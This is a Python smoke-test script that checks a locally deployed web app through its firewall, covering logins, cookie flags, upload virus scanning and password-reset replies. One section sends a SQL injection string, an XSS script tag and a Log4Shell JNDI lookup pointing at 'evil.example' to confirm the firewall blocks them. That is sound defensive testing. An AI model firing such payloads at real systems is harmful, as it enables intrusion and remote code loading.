"""Smoke test of the deployed local stack THROUGH the firewall (http://localhost:8088),
the same path the tunnel uses. Checks login, cookie flags, an upload with the
virus scan, the firewall blocking attacks, and the password-reset reply.

  python deploy_smoke.py [--json evidence/deploy_smoke.json]
"""
import json
import sys
import os

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from wstg_lib import Client, Report, env_value  # noqa: E402
from run_wstg import EICAR, png_bytes  # noqa: E402

API = '/api/v1'
PW = env_value('MARGIN_SEED_ADMIN_PASSWORD')
R = Report()

# 1. Login through the firewall, and the cookie flags it sets
for email in ('student@margin.test', 'lecturer@margin.test'):
    c = Client('waf')
    r = c.login(email, PW)
    R.check('DEPLOY-LOGIN', f'{email} signs in through the firewall', r.status == 200, detail_bad=f'HTTP {r.status} {r.text[:100]}', severity='high')
    me = c.get(API + '/me')
    R.check('DEPLOY-LOGIN', f'{email} /me after login', me.status == 200, detail_bad=f'HTTP {me.status}', severity='high')

s = Client('waf')
r = s.login('student@margin.test', PW)
raw = '; '.join(r.set_cookies)
session_cookies = [x for x in r.set_cookies if 'session' in x.split('=', 1)[0].lower()]
R.check('DEPLOY-COOKIE', 'Session cookie is HttpOnly, Secure, SameSite=Lax',
        bool(session_cookies) and all(all(f in x.lower() for f in ('httponly', 'secure', 'samesite=lax')) for x in session_cookies),
        detail_ok='; '.join(x.split(';', 1)[1].strip() for x in session_cookies),
        detail_bad=raw[:200], severity='high')

# Every API method the app uses must get through the firewall (CRS rule 911100
# blocks PUT/PATCH/DELETE unless they are allowed).
r = s.put(API + '/profile', {'name': "Demo O'Brien-Student (TA)"})
R.check('DEPLOY-WAF', 'PUT (profile edit, with an apostrophe and brackets) passes the firewall', r.status == 200, detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status} {r.text[:80]}', severity='high')
s.put(API + '/profile', {'name': 'Demo Student'})
r = s.request('TRACE', '/')
R.check('DEPLOY-WAF', 'TRACE is still refused', r.status in (403, 405), detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status}', severity='low')

# 2. Upload: a clean image is accepted, the EICAR test virus is refused
assignments = (s.get(API + '/assignments').json() or {}).get('data', [])
target = next((a for a in assignments if a.get('status', 'published') != 'closed'), None)
R.check('DEPLOY-UPLOAD', 'Student can list assignments', bool(target), detail_bad=str(assignments)[:150], severity='medium')
if target:
    aid = target['id']
    r = s.request('POST', API + f'/assignments/{aid}/submissions', files={'files[]': ('diagram.png', 'image/png', png_bytes())}, fields={'content': 'Smoke test upload'})
    R.check('DEPLOY-UPLOAD', 'Clean PNG submission is accepted after the virus scan', r.status in (200, 201), detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status} {r.text[:150]}', severity='high')
    r = s.request('POST', API + f'/assignments/{aid}/submissions', files={'files[]': ('virus.txt', 'text/plain', EICAR)}, fields={'content': 'EICAR test'})
    R.check('DEPLOY-UPLOAD', 'EICAR test file is refused', r.status in (400, 403, 422), detail_ok=f'HTTP {r.status} {r.text[:120]}', detail_bad=f'HTTP {r.status} {r.text[:150]}', severity='critical')

# 3. Firewall blocks attacks before they reach the app
w = Client('waf')
w.csrf()
for title, path in [("SQL injection", API + "/courses?search=1%27%20OR%20%271%27%3D%271"),
                    ("XSS", "/?x=%3Cscript%3Ealert(1)%3C/script%3E"),
                    ("Log4Shell", API + "/search?q=%24%7Bjndi:ldap://evil.example/a%7D")]:
    r = w.request('GET', path, xsrf=False)
    R.check('DEPLOY-WAF', f'Firewall blocks {title}', r.status == 403, detail_ok=f'HTTP {r.status}', detail_bad=f'HTTP {r.status}', severity='high')

# 4. Password reset gives the same neutral reply (mail is sent in the background)
p = Client('waf')
p.csrf()
known = p.post(API + '/forgot-password', {'email': 'student@margin.test'})
unknown = p.post(API + '/forgot-password', {'email': 'nobody-here@margin.test'})
R.check('DEPLOY-RESET', 'Forgot-password reply is identical for known and unknown addresses',
        known.status == unknown.status == 200 and known.text == unknown.text,
        detail_ok=f'HTTP {known.status}', detail_bad=f'{known.status} {known.text[:80]} | {unknown.status} {unknown.text[:80]}', severity='medium')

counts = {k: sum(1 for x in R.rows if x['status'] == k) for k in ('PASS', 'FAIL', 'INFO')}
print(counts)
if '--json' in sys.argv:
    out = sys.argv[sys.argv.index('--json') + 1]
    os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(R.rows, f, indent=2)
sys.exit(1 if counts['FAIL'] else 0)
